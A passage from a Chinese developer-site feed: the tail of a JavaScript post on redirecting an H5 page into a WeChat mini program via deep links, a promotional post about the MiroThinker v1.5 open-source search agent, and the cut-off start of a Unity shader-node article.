document.documentElement.className = <span class="hljs-string">'blank-page'</span>;  
}, <span class="hljs-number">100</span>);  
}  
<span class="hljs-comment">// 华为浏览器兜底  </span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (browserType.isHuawei) {  
document.documentElement.innerHTML = <span class="hljs-string">''</span>;  
document.body.innerHTML = <span class="hljs-string">''</span>;  
window.location.replace(<span class="hljs-string">'about:blank'</span>);  
document.documentElement.style.display = <span class="hljs-string">'none'</span>;  
document.body.style.display = <span class="hljs-string">'none'</span>;  
<span class="hljs-keyword">for</span> (<span class="hljs-type">let</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {  
clearInterval(i);  
clearTimeout(i);  
}  
}  
<span class="hljs-comment">// 其他浏览器通用方案  </span>
<span class="hljs-keyword">else</span> {  
document.body.innerHTML = <span class="hljs-string">''</span>;  
window.location.replace(<span class="hljs-string">'about:blank'</span>);  
document.documentElement.className = <span class="hljs-string">'blank-page'</span>;  
}  
}  
}  
  
<span class="hljs-comment">// 监听页面隐藏（跳转成功），执行清理  </span>
document.addEventListener(<span class="hljs-string">'visibilitychange'</span>, function () {  
<span class="hljs-keyword">if</span> (document.hidden) {  
console.log(<span class="hljs-string">'页面隐藏 → 跳转成功，清理H5页面'</span>);  
<span class="hljs-comment">// 不同浏览器延迟适配  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">let</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> <span class="hljs-number">500</span>; <span class="hljs-comment">// 默认  </span>
<span class="hljs-keyword">if</span> (ua.includes(<span class="hljs-string">'huawei'</span>)) delay = <span class="hljs-number">300</span>; <span class="hljs-comment">// 华为  </span>
<span class="hljs-keyword">if</span> (ua.includes(<span class="hljs-string">'quark'</span>)) delay = <span class="hljs-number">200</span>; <span class="hljs-comment">// 夸克（更快响应）  </span>
  
setTimeout(() =&gt; {  
clearH5PageAfterJump();  
}, delay);  
}  
});  
  
<span class="hljs-comment">// 所有系统统一走a标签跳转  </span>
function <span class="hljs-title function_">jumpByATag</span><span class="hljs-params">(url)</span> {  
<span class="hljs-type">const</span> <span class="hljs-variable">ua</span> <span class="hljs-operator">=</span> navigator.userAgent.toLowerCase();  
<span class="hljs-type">const</span> <span class="hljs-variable">isAndroid</span> <span class="hljs-operator">=</span> ua.indexOf(<span class="hljs-string">'android'</span>) &gt; -<span class="hljs-number">1</span> || ua.indexOf(<span class="hljs-string">'adr'</span>) &gt; -<span class="hljs-number">1</span>;  
<span class="hljs-type">const</span> <span class="hljs-variable">isIOS</span> <span class="hljs-operator">=</span> !!ua.match(/\(i[^;]+;( u;)? cpu.+mac os x/);  
<span class="hljs-type">const</span> <span class="hljs-variable">isXiaomi</span> <span class="hljs-operator">=</span> ua.indexOf(<span class="hljs-string">'mi '</span>) &gt; -<span class="hljs-number">1</span> || ua.indexOf(<span class="hljs-string">'xiaomi'</span>) &gt; -<span class="hljs-number">1</span> ||  
ua.indexOf(<span class="hljs-string">'redmi'</span>) &gt; -<span class="hljs-number">1</span>;  
  
<span class="hljs-keyword">if</span> (isIOS) {  
window.location.href = url;  
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (isAndroid || isXiaomi) {  
<span class="hljs-comment">// 安卓（尤其是⼩⽶）⽤iframe中转  </span>
<span class="hljs-type">const</span> <span class="hljs-variable">ifr</span> <span class="hljs-operator">=</span> document.createElement(<span class="hljs-string">'iframe'</span>);  
ifr.src = url;  
ifr.style.display = <span class="hljs-string">'none'</span>;  
document.body.appendChild(ifr);  
<span class="hljs-comment">// 可选：延时移除，避免影响  </span>
setTimeout(() =&gt; {  
document.body.removeChild(ifr);  
}, <span class="hljs-number">2000</span>);  
} <span class="hljs-keyword">else</span> {  
<span class="hljs-type">const</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> document.createElement(<span class="hljs-string">'a'</span>);  
a.href = url;  
a.style.display = <span class="hljs-string">'none'</span>;  
document.body.appendChild(a);  
a.click();  
<span class="hljs-comment">// 可选：延时移除，避免影响  </span>
setTimeout(() =&gt; {  
document.body.removeChild(a);  
}, <span class="hljs-number">2000</span>);  
}  
}  
  
function <span class="hljs-title function_">loadMWScheme</span><span class="hljs-params">()</span> {  
<span class="hljs-type">var</span> <span class="hljs-variable">appid</span> <span class="hljs-operator">=</span> <span class="hljs-string">"wx5728ecf19f0d9405"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">"pages/index/index"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-string">"develop"</span>;  
<span class="hljs-type">let</span> <span class="hljs-variable">code1</span> <span class="hljs-operator">=</span> `${code}`;  
  
<span class="hljs-type">const</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);  
ticket = params.get(<span class="hljs-string">'ticket'</span>);  
<span class="hljs-type">let</span> <span class="hljs-variable">queryObj</span> <span class="hljs-operator">=</span> <span class="hljs-string">'source=h5&amp;ticket='</span> + ticket + <span class="hljs-string">'&amp;code='</span> + code1;  
<span class="hljs-type">let</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> encodeURIComponent(queryObj);  
<span class="hljs-type">let</span> <span class="hljs-variable">finalUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">'weixin://dl/business/?appid='</span> + appid + <span class="hljs-string">'&amp;path='</span> + path + <span class="hljs-string">'&amp;query='</span> + query + <span class="hljs-string">'&amp;env_version='</span> + env;  
console.log(finalUrl + <span class="hljs-string">'明文跳转'</span>);  
jumpByATag(finalUrl);  
}  
  
function <span class="hljs-title function_">loadScheme</span><span class="hljs-params">(version = <span class="hljs-string">'release'</span>)</span> {  
<span class="hljs-keyword">try</span> {  
<span class="hljs-type">let</span> <span class="hljs-variable">code1</span> <span class="hljs-operator">=</span> `${code}`;  
<span class="hljs-type">const</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(window.location.search);  
ticket = params.get(<span class="hljs-string">'ticket'</span>);  
<span class="hljs-comment">// 鸿蒙系统直接加入白名单  </span>
  
<span class="hljs-comment">// 否则-  </span>
GetWxMiniScheme(code1, ticket, version).then(res =&gt; {  
<span class="hljs-type">const</span> <span class="hljs-variable">schemeUrl</span> <span class="hljs-operator">=</span> res.urlScheme;  
<span class="hljs-type">let</span> <span class="hljs-variable">jumped</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  
<span class="hljs-type">let</span> <span class="hljs-variable">hasReported</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  
<span class="hljs-type">const</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> Date.now();  
  
<span class="hljs-type">const</span> <span class="hljs-variable">handleVisibility</span> <span class="hljs-operator">=</span> () =&gt; {  
<span class="hljs-keyword">if</span> (document.hidden) {  
jumped = <span class="hljs-literal">true</span>;  
console.log(<span class="hljs-string">'页面隐藏 → 推测跳转成功'</span>);  
document.removeEventListener(<span class="hljs-string">'visibilitychange'</span>, handleVisibility);  
clearH5PageAfterJump();  
}  
};  
document.addEventListener(<span class="hljs-string">'visibilitychange'</span>, handleVisibility);  
  
<span class="hljs-type">const</span> <span class="hljs-variable">interval</span> <span class="hljs-operator">=</span> setInterval(() =&gt; {  
<span class="hljs-type">const</span> <span class="hljs-variable">elapsed</span> <span class="hljs-operator">=</span> Date.now() - start;  
<span class="hljs-keyword">if</span> (jumped || hasReported || elapsed &gt; <span class="hljs-number">8000</span>) {  
clearInterval(interval);  
<span class="hljs-keyword">return</span>;  
}  
<span class="hljs-keyword">if</span> (elapsed &gt;= <span class="hljs-number">5000</span> &amp;&amp; !jumped) {  
console.log(<span class="hljs-string">'检测 5 秒未跳转，开始上报'</span>);  
hasReported = <span class="hljs-literal">true</span>;  
reportDeviceInfo(ticket);  
clearInterval(interval);  
}  
}, <span class="hljs-number">1000</span>);  
  
<span class="hljs-comment">// 统一拼接跳转URL 0为明文跳转  </span>
<span class="hljs-type">let</span> <span class="hljs-variable">finalJumpUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">''</span>;  
<span class="hljs-keyword">if</span> (res.status == <span class="hljs-number">0</span>) {  
<span class="hljs-type">var</span> <span class="hljs-variable">appid</span> <span class="hljs-operator">=</span> <span class="hljs-string">"wx5728ecf19f0d9405"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">"pages/index/index"</span>;  
<span class="hljs-type">var</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> version;  
<span class="hljs-type">let</span> <span class="hljs-variable">queryObj</span> <span class="hljs-operator">=</span> <span class="hljs-string">'source=h5&amp;ticket='</span> + ticket + <span class="hljs-string">'&amp;code='</span> + code1;  
<span class="hljs-type">let</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> encodeURIComponent(queryObj);  
finalJumpUrl = <span class="hljs-string">'weixin://dl/business/?appid='</span> + appid + <span class="hljs-string">'&amp;path='</span> + path + <span class="hljs-string">'&amp;query='</span> + query + <span class="hljs-string">'&amp;env_version='</span> + env;  
console.log(finalJumpUrl + <span class="hljs-string">'明文跳转'</span>, res);  
} <span class="hljs-keyword">else</span> {  
finalJumpUrl = schemeUrl;  
console.log(schemeUrl + <span class="hljs-string">' 密文跳转'</span>, res);  
}  
  
<span class="hljs-comment">// 所有系统统一走a标签跳转  </span>
jumpByATag(finalJumpUrl);  
  
}).<span class="hljs-keyword">catch</span>(err =&gt; {  
console.error(<span class="hljs-string">'获取Scheme失败：'</span>, err);  
});  
} <span class="hljs-keyword">catch</span> (err) {  
console.error(<span class="hljs-string">'loadScheme异常：'</span>, err);  
}  
}  
  
function <span class="hljs-title function_">reportDeviceInfo</span><span class="hljs-params">(ticket1 = ticket)</span> {  
console.log(navigator.userAgent, navigator, <span class="hljs-string">'navigator'</span>, ticket1)  
<span class="hljs-keyword">if</span> (!isHo) {  
p3.innerText = <span class="hljs-string">'非鸿蒙系统，请从App跳转小程序'</span>  
p.innerText = <span class="hljs-string">'系统类型:'</span> + deviceInfo.systemType + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'版本号:'</span> + deviceInfo.systemVersion + <span class="hljs-string">'\n平台:'</span> + deviceInfo.platform + <span class="hljs-string">'\n'</span> + <span class="hljs-string">'UserAgent: '</span> + deviceInfo.userAgent + <span class="hljs-string">'data"'</span> + navigator.userAgentData;  
console.log(<span class="hljs-string">'检测设备信息：'</span>, deviceInfo, navigator.userAgentData, <span class="hljs-string">'userAgentData'</span>, systemType);  
ELEMENT.Message({  
message: <span class="hljs-string">'请点击进入小程序，失败可选择上报设备信息,从小程序进入'</span>,  
type: <span class="hljs-string">'warning'</span>  
});  
document.getElementById(<span class="hljs-string">'hmbtn2'</span>).style.display = <span class="hljs-string">'block'</span>;  
document.getElementById(<span class="hljs-string">'fhmbtn2'</span>).style.display = <span class="hljs-string">'block'</span>;  
<span class="hljs-keyword">return</span>  
}  
AddWhitelist(ticket1, systemType + systemVersion).then(res =&gt; {  
<span class="hljs-keyword">if</span> (res == <span class="hljs-string">''</span>)  
res = <span class="hljs-string">'已经加入白名单，请从访客小程序入口进入'</span>  
ELEMENT.Message({  
message: res,  
type: <span class="hljs-string">'error'</span>  
});  
}).<span class="hljs-keyword">catch</span>(err =&gt; {  
console.log(err, <span class="hljs-string">'err'</span>)  
})  
}  
  
function <span class="hljs-title function_">joinWhiteList</span><span class="hljs-params">()</span> {  
<span class="hljs-type">let</span> <span class="hljs-variable">ticket1</span> <span class="hljs-operator">=</span> ticket  
<span class="hljs-title function_">AddWhitelist</span><span class="hljs-params">(ticket1, systemType + systemVersion)</span>.then(res =&gt; {  
<span class="hljs-keyword">if</span> (res == <span class="hljs-string">''</span>)  
res = <span class="hljs-string">'已经加入白名单，请从访客小程序入口进入'</span>  
ELEMENT.Message({  
message: res,  
type: <span class="hljs-string">'error'</span>  
});  
}).<span class="hljs-keyword">catch</span>(err =&gt; {  
console.log(err, <span class="hljs-string">'err'</span>)  
})  
}  
&lt;/script&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GitHub 上 2300 点赞的搜索 Agent，有点惊艳啊。]]></title>    <link>https://juejin.cn/post/7592939457042464820</link>    <guid>https://juejin.cn/post/7592939457042464820</guid>    <pubDate>2026-01-09T05:59:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592939457042464820" data-draft-id="7592892218669170722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GitHub 上 2300 点赞的搜索 Agent，有点惊艳啊。"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-01-09T05:59:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GitHub 上 2300 点赞的搜索 Agent，有点惊艳啊。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:59:40.000Z" title="Fri Jan 09 2026 05:59:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>1 月 5 日，MiroMind AI 正式发布并开源了 <strong>MiroThinker v1.5</strong>。</p>
<p>这是一个全球领先的开源搜索 Agent。</p>
<p><strong>MiroThinker 是开源界首个不拼参数大小，而是让 AI 像人类一样疯狂查资料、写代码、不断试错和修正，让小模型也能解决高难度任务的搜索 Agent。</strong></p>
<p><strong>而且在BrowseComp 测试上</strong>超过了 ChatGPT-Agent。在 BrowseComp-ZH 上超越了 Kimi-K2-Thinking，而且成本更低，仅用了 1/30 的参数。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/077d22b0fd544b29b56dce45fb584c55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=4xd6na6O3%2BMuWOuejKE9wLMyXBk%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>BrowseComp 是 OpenAI 研发的一个开源测试基准，专门用于评估 AI 模型，尤其是具备网页浏览功能的 Agent 在互联网上查找复杂、关联信息的能力。</p>
<h2 data-id="heading-0">01、开源项目简介</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/002bb5b6a6cf48b1a1369683e775e63a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=gB%2BAHDxGy3L5rJH0DhbI%2FidIQ50%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">开源地址：https:<span class="hljs-comment">//github.com/MiroMindAI/MiroThinker</span>
</code></pre>
<p>MiroThinker 可以通过调用外部工具和网络搜索来辅助 AI 完成复杂的推理与深度研究任务。 </p>
<p>它采用了一种独特的交互式扩展技术（Interactive Scaling），使模型能够在长篇对话中通过不断的反馈来自我修正，从而更精准地获取信息。 </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f389b11dcdfc4d8889260f6b7c8ece67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=UrERqUdoR7cz3GlhIDixfWtQv%2FQ%3D" alt="图片" loading="lazy"/><img src="" alt="" loading="lazy"/></p>
<p>不同于传统模型在封闭的参数空间内进行线性推理，MiroThinker 被训练成了一个懂得「向外求助」的Agent：</p>
<ul>
<li>主动求证：遇到不确定问题，不是根据概率瞎猜，而是像严谨的研究员一样拆解问题、检索证据。</li>
<li>多轮修正：建立「推理-验证-修正」的闭环，一旦发现外部证据与假设冲突，立即调整路径，直到证据收敛。</li>
<li>去伪存真：训练中系统性惩罚缺乏信源的高置信度回答，倒逼模型养成「无证据不开口」的本能。</li>
</ul>
<h2 data-id="heading-1">02、使用一下</h2>
<p>case1：请帮我调研一下2026年全球 AI 大模型市场的最新竞争格局。</p>
<p>可以看到这个提示词输入下去，MiroThinker 一共进行了 30 多次搜索，10 多次浏览网页，最终才把它认为 OK 的结论呈现给你。</p>
<pre><code class="hljs language-arduino" lang="arduino">结果地址：https:<span class="hljs-comment">//dr.miromind.ai/share/15ba9138-617f-4002-91a6-64a0a2e43c8a</span>
</code></pre>
<p>建议看一下这个视频，看看 MiroThinker 的分析结果。</p>
<p>你会发现它不像是 AI 输出的，真的像一个资深研究员写的东西。比如第十章对 2026 年的判断：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e79bb13ecfd54e499436c05c6eec7bdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=%2F1apRe%2FPTCzj2wfT8aPqZ%2BHY1gI%3D" alt="图片" loading="lazy"/>有一个很有意思的点，你把这个提示词丢进其它 Agent 产品里面，很多生成的报告中，国外 AI 大模型厂商都没有提到 <strong>Google Gemini。</strong> <strong>但是 2025 年 Gemini 3 和 Nano Banana 等模型，足够让 Google 进入世界 TOP 3 的行列了。</strong></p>
<p>case2：搜索 Manus 核心成员的访谈记录，详细介绍一下每一个核心成员访谈时聊了啥，重点介绍一下 Manus 的立项、诞生历程，一定要详细。</p>
<pre><code class="hljs language-arduino" lang="arduino">结果地址：https:<span class="hljs-comment">//dr.miromind.ai/share/a6a74739-d3e4-4f2f-9675-9ca51e1326e4</span>
</code></pre>
<p>最近把 Manus 相关的访谈听了一个遍，MiroThinker 给的结果非常惊艳、非常惊艳，核心重点都覆盖到了。</p>
<p>case3：请你搜索北京的明星 AI 初创公司，介绍一下公司名称、具体业务、融资信息、产品信息、赛道等等。</p>
<pre><code class="hljs language-arduino" lang="arduino">生成地址：https:<span class="hljs-comment">//dr.miromind.ai/share/7033378d-50e5-47d6-a082-760cffb0f5f3</span>
</code></pre>
<p>case4：A 股会在春节前涨到多少？</p>
<pre><code class="hljs language-arduino" lang="arduino">生成地址：https:<span class="hljs-comment">//dr.miromind.ai/share/e12611c9-bcde-475b-a153-4d9aaef92fe6</span>
</code></pre>
<p>简短总结一句话版：</p>
<p>在目前 4080 点附近强势位置上，结合过去 20 年数据和今年政策环境，更大概率是春节前围绕现在点位上下若干百分点的震荡偏强，历史统计对应的大致区间大约在 4 000–4 200 点一带，但这不是预测，实际可能因突发因素大幅偏离。</p>
<p>很有意思，MiroThinker 主张放弃对具体点位的精准预测。</p>
<p>通过叠加历史「春节效应」统计数据与当前强劲的政策及行情趋势，构建一个基于概率的合理波动区间（而非确定数值）作为投资决策的参考。</p>
<h2 data-id="heading-2">02、怎么使用</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2025434b1b774baf80b4cb1350aba716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768543180&amp;x-signature=QNAe3Q7V0ji%2BWlHjzMSPcB46lUs%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">体验地址：https://dr.miromind.ai/开源地址：https://github.com/MiroMindAI/MiroThinker模型下载：https://huggingface.co/miromind-ai/MiroThinker-v1.5-235B
</code></pre>
<p>现在 AI 大模型都在疯狂内卷参数规模，试图想把全世界知识背进模型里面。单纯堆砌内部参数的 Scaling Law 可能已触及天花板。</p>
<p>MiroThinker 让我们看到一个新的路线，可能真正的通用人工智能（AGI）不应是死记硬背的做题家，而应是具备发现式智能的科学家。</p>
<p>更多详细视频案例介绍，请查看原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFEJtibpzlG3_pUKMHR0NiA" target="_blank" title="https://mp.weixin.qq.com/s/FEJtibpzlG3_pUKMHR0NiA" ref="nofollow noopener noreferrer">mp.weixin.qq.com/s/FEJtibpzl…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【节点】[Channel-Combine节点]原理解析与实际应用]]></title>    <link>https://juejin.cn/post/7592996072705572914</link>    <guid>https://juejin.cn/post/7592996072705572914</guid>    <pubDate>2026-01-09T06:03:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705572914" data-draft-id="7592992745573564454" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【节点】[Channel-Combine节点]原理解析与实际应用"/> <meta itemprop="keywords" content="游戏开发,图形学,Unity3D"/> <meta itemprop="datePublished" content="2026-01-09T06:03:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="SmalBox"/> <meta itemprop="url" content="https://juejin.cn/user/2218166695237532"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【节点】[Channel-Combine节点]原理解析与实际应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2218166695237532/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SmalBox
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:03:11.000Z" title="Fri Jan 09 2026 06:03:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
